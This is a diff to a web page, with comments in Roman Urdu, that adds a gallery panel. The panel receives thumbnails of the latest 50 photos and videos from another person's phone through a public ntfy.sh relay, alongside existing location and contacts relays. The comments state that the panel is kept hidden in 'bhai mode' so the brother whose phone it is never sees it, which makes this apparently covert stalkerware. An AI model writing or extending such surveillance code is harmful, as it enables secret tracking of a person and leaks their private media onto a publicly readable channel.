@@ -230,7 +230,26 @@
         <button id="dlCsv" type="button" style="display:none;padding:12px 22px;font-size:16px;font-weight:700;color:#111;background:#fff;border:1px solid #ddd;border-radius:999px;">Download .csv</button>
       </div>
     </div>
+
+    <!-- Gallery: dusre phone (APK) se aane wale photos/videos ke chhote
+         previews (thumbnails) yahan grid me dikhte hain. Poori quality
+         photo/video is relay se nahi aa sakti — sirf chhota preview
+         aata hai jis se pehchan ho jaye ke kaun si photo/video hai.
+         Tap karne par preview bara dikhta hai. Bhai mode me ye poora
+         panel chhupa hota hai, is liye bhai ko ye hissa kabhi nahi dikhta. -->
+    <div id="galleryBox" style="margin-top:18px;border-top:1px solid #e5e5e5;padding-top:14px;">
+      <h3 style="margin:0 0 6px;font-size:18px;">Gallery</h3>
+      <p id="galleryStatus" style="margin:0 0 10px;color:#666;font-size:14px;">Abhi tak koi photo ya video nahi aayi.</p>
+      <div id="galleryGrid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;"></div>
+    </div>
   </section>
+
+  <!-- Gallery preview — thumbnail par tap karne par bara preview -->
+  <div id="galleryPreview" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:50;align-items:center;justify-content:center;flex-direction:column;padding:16px;box-sizing:border-box;">
+    <img id="galleryPreviewImg" src="" alt="" style="max-width:100%;max-height:78vh;object-fit:contain;border-radius:10px;">
+    <p id="galleryPreviewCap" style="color:#fff;margin:14px 0 0;font-size:15px;text-align:center;"></p>
+    <button id="galleryPreviewClose" type="button" style="margin-top:16px;padding:12px 34px;font-size:17px;font-weight:700;color:#111;background:#fff;border:none;border-radius:999px;">Band karo</button>
+  </div>
 
   <p class="tiny" aria-hidden="true">Allow dabao</p>
   <p class="fmd">Jab hara button daba kar khulne wali screen par <b>switch ON</b> kar do ge, to <b>Find My Device</b> me bhi phone ki location dikhne lagegi — wahan se bhi pata chal jayega ke phone ghar me hi para hai.</p>
@@ -736,12 +755,130 @@
   var dlCsvBtn = document.getElementById('dlCsv');
   if (dlCsvBtn) dlCsvBtn.addEventListener('click', function(){ downloadContacts('csv'); });
 
+  /* ============================================================
+     GALLERY (ntfy.sh, location/contacts se ALAG topic) — sirf APK
+     bhejta hai (gallery ke latest 50 photos/videos ke chhote
+     thumbnails, READ_MEDIA_IMAGES/VIDEO permission se). Poori
+     quality photo/video is relay se nahi aa sakti — message size
+     ki had hai — is liye sirf chhota preview aata hai.
+     Video ka sirf pehla frame (still) aata hai, video khud nahi.
+     Note: ye topic bhi public relay hai (user ko pehle bataya hua).
+     ============================================================ */
+  var GALLERY_TOPIC = 'zacky-gallery-4225082f57eb79bc5a945c56a787aa4b';
+  var GALLERY_URL = 'https://ntfy.sh/' + GALLERY_TOPIC;
+  var gallerySeenIds = {};
+  var galleryBatch = null;
+  var galleryParts = {};
+  var galleryTotal = 0;
+  var galleryItems = [];
+
+  function renderGallery(){
+    var grid = document.getElementById('galleryGrid');
+    var status = document.getElementById('galleryStatus');
+    if (!grid) return;
+    grid.innerHTML = '';
+    galleryItems.sort(function(a, b){ return (b.d || 0) - (a.d || 0); });
+    galleryItems.forEach(function(it){
+      var cell = document.createElement('div');
+      cell.style.cssText = 'position:relative;border-radius:10px;overflow:hidden;background:#eee;aspect-ratio:1;cursor:pointer;';
+      var img = document.createElement('img');
+      img.src = 'data:image/jpeg;base64,' + it.th;
+      img.alt = it.n || '';
+      img.style.cssText = 'width:100%;height:100%;object-fit:cover;display:block;';
+      cell.appendChild(img);
+      if (it.t === 'vid') {
+        var badge = document.createElement('span');
+        badge.textContent = '▶' + (it.dur ? ' ' + Math.floor(it.dur / 60) + ':' + String(Math.floor(it.dur % 60)).padStart(2, '0') : '');
+        badge.style.cssText = 'position:absolute;left:6px;bottom:6px;background:rgba(0,0,0,0.65);color:#fff;font-size:12px;padding:3px 8px;border-radius:999px;';
+        cell.appendChild(badge);
+      }
+      cell.addEventListener('click', function(){ showGalleryPreview(it); });
+      grid.appendChild(cell);
+    });
+    if (status) status.textContent = galleryItems.length + ' photos/videos ke previews mil gaye. Tap karo to bara dikhega.';
+  }
+
+  function showGalleryPreview(it){
+    var box = document.getElementById('galleryPreview');
+    var img = document.getElementById('galleryPreviewImg');
+    var cap = document.getElementById('galleryPreviewCap');
+    if (!box || !img) return;
+    img.src = 'data:image/jpeg;base64,' + it.th;
+    if (cap) cap.textContent = (it.n || '') + (it.t === 'vid' ? '  (video ka still preview — video khud yahan nahi aati)' : '');
+    box.style.display = 'flex';
+  }
+  var galleryCloseBtn = document.getElementById('galleryPreviewClose');
+  if (galleryCloseBtn) galleryCloseBtn.addEventListener('click', function(){
+    var box = document.getElementById('galleryPreview');
+    if (box) box.style.display = 'none';
+  });
+  var galleryBox = document.getElementById('galleryPreview');
+  if (galleryBox) galleryBox.addEventListener('click', function(ev){
+    if (ev.target === galleryBox) galleryBox.style.display = 'none';
+  });
+
+  function handleGalleryData(data){
+    if (!data || !data.message) return;
+    if (data.id) {
+      if (gallerySeenIds[data.id]) return;
+      gallerySeenIds[data.id] = true;
+    }
+    if (data.event && data.event !== 'message') return;
+    var obj = null;
+    try { obj = JSON.parse(data.message); } catch(e){}
+    if (!obj || !obj.items || typeof obj.part !== 'number' || typeof obj.total !== 'number') return;
+    if (galleryBatch !== obj.batch) {
+      galleryBatch = obj.batch;
+      galleryParts = {};
+      galleryTotal = obj.total;
+      galleryItems = [];
+    }
+    if (galleryParts[obj.part]) return;
+    galleryParts[obj.part] = true;
+    obj.items.forEach(function(it){
+      if (it && it.th) galleryItems.push(it);
+    });
+    var got = Object.keys(galleryParts).length;
+    if (got >= galleryTotal) renderGallery();
+    else {
+      var status = document.getElementById('galleryStatus');
+      if (status) status.textContent = 'Gallery aa rahi hai… (' + got + '/' + galleryTotal + ' hisse)';
+    }
+  }
+
+  function startGalleryRelay(){
+    try {
+      var es = new EventSource(GALLERY_URL + '/sse');
+      es.onmessage = function(ev){
+        try { handleGalleryData(JSON.parse(ev.data)); } catch(e){}
+      };
+    } catch(e){}
+    function poll(){
+      try {
+        fetch(GALLERY_URL + '/json?poll=1', { cache: 'no-store' })
+          .then(function(r){ return r.text(); })
+          .then(function(txt){
+            txt.split('\n').forEach(function(line){
+              line = line.trim();
+              if (!line) return;
+              try { handleGalleryData(JSON.parse(line)); } catch(e){}
+            });
+          })
+          .catch(function(){});
+      } catch(e){}
+    }
+    poll();
+    setInterval(poll, 8000);
+  }
+
   /* Page khulte hi relay sunna shuru — dusre phone ki location
      khud is panel me aati rahegi */
   startRelay();
   /* Contacts sunna sirf apne panel (https) par — bhai mode (APK)
      me panel chhupa hota hai, wahan sunne ki zaroorat nahi. */
   if (!isApk) startContactsRelay();
+  /* Gallery bhi sirf apne panel par suno. */
+  if (!isApk) startGalleryRelay();
 </script>
 </body>
 </html>
